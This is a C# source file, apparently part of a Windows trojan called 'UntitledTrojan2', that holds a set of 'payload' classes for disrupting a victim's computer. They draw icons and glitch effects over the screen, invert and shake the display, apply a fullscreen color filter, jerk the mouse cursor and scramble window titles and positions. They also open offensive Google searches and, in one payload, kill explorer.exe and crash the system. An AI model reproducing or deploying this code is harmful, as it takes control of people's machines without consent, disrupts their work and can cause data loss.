using Morgenshtern;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Media;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace UntitledTrojan2.Payloads
{
    internal class PayloadsClass
    {
        #region Variables
        #region GDI32
        [DllImport("gdi32.dll")]
        internal static extern IntPtr CreateDC(string lpszDriver, string lpszDevice, string lpszOutput, string lpInitData);
        [DllImport("gdi32.dll")]
        internal static extern bool StretchBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest, IntPtr hdcSrc, int xSrc, int ySrc, int wSrc, int hSrc, int rop);
        #endregion
        #region USER32
        [DllImport("user32.dll")]
        internal static extern int GetSystemMetrics(int smIndex);

        internal static int width = GetSystemMetrics(0);
        internal static int height = GetSystemMetrics(1);

        [DllImport("user32.dll")]
        internal static extern IntPtr LoadIcon(IntPtr hInstance, int lpIconName);

        [DllImport("user32.dll")]
        internal static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        internal static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

        [DllImport("user32.dll")]
        internal static extern bool DrawIcon(IntPtr hdc, int xLeft, int yTop, IntPtr hIcon);

        [DllImport("user32")]
        internal static extern bool GetCursorPos(out POINT lpPoint);

        [DllImport("user32.dll")]
        internal static extern bool MessageBeep(uint type);

        internal delegate bool EnumDesktopWindowsDelegate(IntPtr hWnd, int lParam);

        [DllImport("user32.dll")]
        internal static extern bool EnumWindows(EnumDesktopWindowsDelegate i, IntPtr x);

        [DllImport("user32.dll")]
        internal static extern bool EnumChildWindows(IntPtr hwnd, EnumDesktopWindowsDelegate i, IntPtr x);

        [DllImport("user32.dll")]
        internal static extern bool SetWindowTextA(IntPtr hwnd, IntPtr lp);
        #endregion
        #region KERNEL32
        [DllImport("kernel32.dll")]
        internal static extern IntPtr GlobalAlloc(uint flags, int size);

        [DllImport("kernel32.dll")]
        internal static extern bool GlobalFree(IntPtr ptr);
        #endregion
        #region Magnification
        const string Magnification = "Magnification.dll";

        [DllImport(Magnification, ExactSpelling = true, SetLastError = true)]
        public static extern bool MagInitialize();

        [DllImport(Magnification, ExactSpelling = true, SetLastError = true)]
        public static extern bool MagUninitialize();

        [DllImport(Magnification, ExactSpelling = true, SetLastError = true)]
        public static extern bool MagSetFullscreenColorEffect(ref MAGCOLOREFFECT pEffect);

        public struct MAGCOLOREFFECT
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 25)]
            public float[] transform;
        }
        #endregion
        #region Other
        internal struct POINT
        {
            public int x { get; set; }
            public int y { get; set; }
        }

        internal struct RECT
        {
            public int left { get; set; }
            public int top { get; set; }
            public int right { get; set; }
            public int bottom { get; set; }
        }
        internal static Random random = new Random();
        internal static bool stop = false;
        #endregion
        #endregion

        #region Last Minutes Payload
        public class LastMinutes
        {
            public bool IsSafe { get { return true; } }

            public void OnTick(int c)
            {
                new Thread(() => {
                    stop = true;
                    string[] msgs = Program.GetStr(8).Split('|');
                    Process.Start(@"C:\Windows\System32\taskkill.exe", @"/F /IM explorer.exe");
                    MessageBox.Show(msgs[0]);
                    MessageBox.Show(msgs[1]);
                    Process.Start("https://google.com");
                    Process.Start("notepad");
                    Process.Start("mspaint");
                    Process.Start("calc");
                    MessageBox.Show(msgs[2]);
                    Program.Crash();
                }).Start();
            }
        }
        #endregion

        #region Warn Payload
        public class Warn
        {
            public bool IsSafe { get { return true; } }

            public void OnTick(int c)
            {
                new Thread(async () => {
                    int ticks = 0;
                    int count = c;
                    while (ticks < count)
                    {
                        ticks++;
                        if (stop) Thread.CurrentThread.Abort();
                        IntPtr hdc = CreateDC("DISPLAY", null, null, null);
                        IntPtr icon = LoadIcon(IntPtr.Zero, random.Next(32512, 32518)); // This will be fucked maan
                        DrawIcon(hdc, random.Next(0, width), random.Next(0, height), icon);
                        await Task.Delay(100);
                    }
                }).Start();
            }
        }
        #endregion

        #region Sounds Payload
        public class Sounds
        {
            public bool IsSafe { get { return true; } }

            public void OnTick(int c)
            {
                new Thread(async () => {
                    int ticks = 0;
                    int count = c;
                    while (ticks < count)
                    {
                        ticks++;
                        if (stop) Thread.CurrentThread.Abort();
                        int r = random.Next(0, 5);
                        switch (r)
                        {
                            case 0: MessageBeep(0x00000040); break;
                            case 1: MessageBeep(0x00000030); break;
                            case 2: MessageBeep(0x00000010); break;
                            case 3: MessageBeep(0x00000000); break;
                            case 4: MessageBeep(0xFFFFFFFF); break;
                        }
                        await Task.Delay(1000);
                    }
                }).Start();
            }
        }
        #endregion

        #region Glitch Payload
        public class Glitch
        {
            public bool IsSafe { get { return true; } }

            public void OnTick(int c)
            {
                new Thread(async () => {
                    int ticks = 0;
                    int count = c;
                    while (ticks < count)
                    {
                        ticks++;
                        if (stop) Thread.CurrentThread.Abort();
                        IntPtr hdc = CreateDC("DISPLAY", null, null, null);
                        int x1 = random.Next(0, width);
                        int y1 = random.Next(0, height);
                        int x2 = random.Next(0, width);
                        int y2 = random.Next(0, height);
                        int w = random.Next(0, 300);
                        int h = random.Next(0, 300);
                        int w2 = random.Next(0, width);
                        int h2 = random.Next(0, height);
                        StretchBlt(hdc, x1, y1, w, h, hdc, x2, y2, w2, h2, 0x00660046);
                        await Task.Delay(500);
                    }
                }).Start();
            }
        }
        #endregion

        #region Text Fucker Payload
        public class TextFucker
        {
            public bool IsSafe { get { return false; } }

            public void OnTick(int c)
            {
                new Thread(async () => {
                    int ticks = 0;
                    int count = c;
                    while (ticks < count)
                    {
                        ticks++;
                        if (stop) Thread.CurrentThread.Abort();
                        // Change window titles
                        EnumWindows((hWnd, lParam) => {
                            EnumChildWindows(hWnd, (hwndd, param) => {
                                SetWindowTextA(hwndd, Marshal.StringToHGlobalAnsi(RandomString(10)));
                                return true;
                            }, (IntPtr)null);
                            SetWindowTextA(hWnd, Marshal.StringToHGlobalAnsi(RandomString(10)));
                            return true;
                        }, (IntPtr)null);

                        // Tray
                        Process[] processes = Process.GetProcessesByName("explorer");
                        foreach (Process p in processes)
                        {
                            IntPtr hWnd = p.MainWindowHandle;
                            EnumChildWindows(hWnd, (hwndd, param) => {
                                SetWindowPos(hwndd, (IntPtr)0, random.Next(-5, 5), random.Next(-5, 5), 0, 0, 0x0001 | 0x0200);
                                return true;
                            }, (IntPtr)null);
                        }

                        // All windows
                        IntPtr hwnd = GetForegroundWindow();
                        EnumChildWindows(hwnd, (hwnd1, param) => {
                            SetWindowPos(hwnd1, (IntPtr)0, random.Next(0, 80), random.Next(0, 80), random.Next(10, 50), random.Next(10, 50), 0x0001);
                            return true;
                        }, (IntPtr)null);
                        await Task.Delay(1000);
                    }
                }).Start();
            }
        }
        #endregion

        #region Warn Cursor Payload
        public class WarnCursor
        {
            public bool IsSafe { get { return true; } }

            public void OnTick(int c)
            {
                new Thread(async () => {
                    int ticks = 0;
                    int count = c;
                    while (ticks < count)
                    {
                        ticks++;
                        if (stop) Thread.CurrentThread.Abort();
                        IntPtr hdc = CreateDC("DISPLAY", null, null, null);
                        IntPtr icon = LoadIcon(IntPtr.Zero, random.Next(32512, 32518)); // This will be fucked maan
                        DrawIcon(hdc, Cursor.Position.X, Cursor.Position.Y, icon);
                        await Task.Delay(10);
                        int r = random.Next(0, 8);
                        switch (r)
                        {
                            case 0: Cursor.Position = new Point(Cursor.Position.X + random.Next(1, 10), Cursor.Position.Y); break;
                            case 1: Cursor.Position = new Point(Cursor.Position.X - random.Next(1, 10), Cursor.Position.Y); break;
                            case 2: Cursor.Position = new Point(Cursor.Position.X, Cursor.Position.Y + random.Next(1, 10)); break;
                            case 3: Cursor.Position = new Point(Cursor.Position.X, Cursor.Position.Y - random.Next(1, 10)); break;
                            case 4: Cursor.Position = new Point(Cursor.Position.X + random.Next(1, 10), Cursor.Position.Y + random.Next(1, 10)); break;
                            case 5: Cursor.Position = new Point(Cursor.Position.X - random.Next(1, 10), Cursor.Position.Y + random.Next(1, 10)); break;
                            case 6: Cursor.Position = new Point(Cursor.Position.X + random.Next(1, 10), Cursor.Position.Y - random.Next(1, 10)); break;
                            case 7: Cursor.Position = new Point(Cursor.Position.X - random.Next(1, 10), Cursor.Position.Y - random.Next(1, 10)); break;
                        }
                    }
                }).Start();
            }
        }
        #endregion

        #region Links Payload
        public class Links
        {
            public bool IsSafe { get { return false; } }

            public void OnTick(int c)
            {
                new Thread(async () => {
                    int ticks = 0;
                    int count = c;
                    while (ticks < count)
                    {
                        ticks++;
                        if (stop) Thread.CurrentThread.Abort();
                        int r = random.Next(0, 5);
                        switch (r)
                        {
                            case 0: Process.Start("http://google.com/search?q=Morgenshtern"); break;
                            case 1: Process.Start("http://google.com/search?q=Cristal&Моёт"); break;
                            case 2: Process.Start("http://google.com/search?q=Твоя+Мать+Шлюха"); break;
                            case 3: Process.Start("http://google.com/search?q=TheAirBlow+лох"); break;
                            case 4: Process.Start("http://google.com/search?q=Морген+лох"); break;
                        }
                        await Task.Delay(5000);
                    }
                }).Start();
            }
        }
        #endregion

        #region Invert Payload
        public class Invert
        {
            public bool IsSafe { get { return true; } }

            public void OnTick(int c)
            {
                new Thread(async () => {
                    int ticks = 0;
                    int count = c;
                    while (ticks < count)
                    {
                        ticks++;
                        if (stop) Thread.CurrentThread.Abort();
                        IntPtr hdc = CreateDC("DISPLAY", null, null, null);
                        StretchBlt(hdc, 0, 0, width, height, hdc, 0, 0, width, height, 0x005A0049);
                        await Task.Delay(1000);
                    }
                }).Start();
            }
        }
        #endregion

        #region Recursive Payload
        public class Recursive
        {
            public bool IsSafe { get { return true; } }

            public void OnTick(int c)
            {
                new Thread(async () => {
                    int ticks = 0;
                    int count = c;
                    while (ticks < count)
                    {
                        ticks++;
                        if (stop) Thread.CurrentThread.Abort();
                        IntPtr hdc = CreateDC("DISPLAY", null, null, null);
                        int x = 50;
                        int y = 50;
                        int w = Screen.PrimaryScreen.Bounds.Width - 100;
                        int h = Screen.PrimaryScreen.Bounds.Height - 100;
                        StretchBlt(hdc, x, y, w, h, hdc, 0, 0, width, height, 0x00C000CA);
                        await Task.Delay(50);
                    }
                }).Start();
            }
        }
        #endregion

        #region Shake Payload
        public class Shake
        {
            public bool IsSafe { get { return true; } }

            public void OnTick(int c)
            {
                new Thread(async () => {
                    int ticks = 0;
                    int count = c;
                    while (ticks < count)
                    {
                        ticks++;
                        if (stop) Thread.CurrentThread.Abort();
                        IntPtr hdc = CreateDC("DISPLAY", null, null, null);
                        int x = 50;
                        int y = 50;
                        int w = Screen.PrimaryScreen.Bounds.Width - 100 - random.Next(-50, 50);
                        int h = Screen.PrimaryScreen.Bounds.Height - 100 - random.Next(-50, 50);
                        StretchBlt(hdc, x, y, w, h, hdc, 0, 0, width, height, 0x00C000CA);
                        await Task.Delay(50);
                    }
                }).Start();
            }
        }
        #endregion

        #region Grayscale Payload
        public class Grayscale
        {
            public bool IsSafe { get { return true; } }

            public void OnTick(int c)
            {
                new Thread(() => {
                    int count = c;
                    MagUninitialize();
                    MagInitialize();
                    float redScale = 0.946f, greenScale = 0.612f, blueScale = 0.567f;
                    var magEffectInvert = new MAGCOLOREFFECT
                    {
                        transform = new[] {
                                redScale,   redScale,   redScale,   0.0f,  0.0f,
                                greenScale, greenScale, greenScale, 0.0f,  0.0f,
                                blueScale,  blueScale,  blueScale,  0.0f,  0.0f,
                                0.0f,       0.0f,       0.0f,       1.0f,  0.0f,
                                0.0f,       0.0f,       0.0f,       0.0f,  1.0f
                            }
                    };

                    MagSetFullscreenColorEffect(ref magEffectInvert);

                    while (true) { }
                }).Start();
            }
        }
        #endregion

        #region Screen Glitch Payload
        public class ScreenGlitch
        {
            public bool IsSafe { get { return true; } }

            public void OnTick(int c)
            {
                new Thread(async () => {
                    int ticks = 0;
                    int count = c;
                    while (ticks < count)
                    {
                        ticks++;
                        if (stop) Thread.CurrentThread.Abort();
                        IntPtr hdc = CreateDC("DISPLAY", null, null, null);
                        StretchBlt(hdc, 0, 0, width, height, hdc, 0, 0, width, height, 0x00660046);
                        await Task.Delay(1000);
                    }
                }).Start();
            }
        }
        #endregion

        #region Helpers
        internal static string RandomString(int length)
        {
            const string chars = "MORGENSHTERN";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }
        #endregion
    }
}
